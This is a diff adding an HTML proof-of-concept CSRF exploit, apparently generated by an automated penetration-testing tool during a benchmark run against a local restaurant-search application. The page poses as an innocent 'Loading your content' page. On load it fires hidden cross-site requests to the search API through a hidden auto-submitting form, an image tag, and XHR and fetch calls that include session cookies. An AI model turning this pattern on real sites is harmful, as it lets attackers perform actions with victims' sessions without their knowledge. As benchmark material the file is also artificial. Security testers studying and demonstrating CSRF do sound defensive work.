@@ -1,0 +1,57 @@
+<!-- 
+POC: CSRF attack that triggers search API requests from an external domain without CSRF token validation
+Target: ./repo
+Created: 2025-12-02T16:34:14.892Z
+Session: benchmark-XBEN-069-24-miorxjei
+
+To test this POC:
+1. Open this file in a web browser: file:///home/daytona/.pensar/executions/benchmark-XBEN-069-24-miorxjei/pocs/poc_csrf_search_restaurant.html
+2. Or serve it and navigate to the target application
+3. Observe the vulnerability demonstration (e.g., XSS alert, CSRF execution)
+-->
+
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Innocent Looking Page</title>
+</head>
+<body>
+    <h1>Loading your content...</h1>
+    <p>Please wait while we load your page.</p>
+    
+    <!-- Hidden CSRF attack form - auto-submits to trigger search on target site -->
+    <form id="csrf-form" action="http://localhost:8080/api/search_restaurants.php" method="GET" style="display:none;">
+        <input type="hidden" name="query" value="malicious_search_payload">
+    </form>
+    
+    <!-- Image tag alternative - GET request via img src -->
+    <img src="http://localhost:8080/api/search_restaurants.php?query=csrf_via_img_tag" style="display:none;" onerror="console.log('CSRF attempt via img tag')">
+    
+    <script>
+        // Auto-submit the CSRF form when page loads
+        document.getElementById('csrf-form').submit();
+        
+        // Alternative CSRF method using AJAX with credentials
+        console.log('Attempting CSRF via XMLHttpRequest with credentials...');
+        var xhr = new XMLHttpRequest();
+        xhr.withCredentials = true; // Include session cookie
+        xhr.open('GET', 'http://localhost:8080/api/search_restaurants.php?query=csrf_via_ajax', true);
+        xhr.onload = function() {
+            console.log('CSRF request completed');
+        };
+        xhr.send();
+        
+        // Alternative CSRF method using Fetch API
+        console.log('Attempting CSRF via Fetch API...');
+        fetch('http://localhost:8080/api/search_restaurants.php?query=csrf_via_fetch', {
+            method: 'GET',
+            credentials: 'include', // Include session cookie
+            mode: 'no-cors' // Bypass CORS for cross-origin requests
+        }).then(response => {
+            console.log('Fetch CSRF attempt sent');
+        }).catch(error => {
+            console.log('Fetch error (expected for CORS):', error);
+        });
+    </script>
+</body>
+</html>
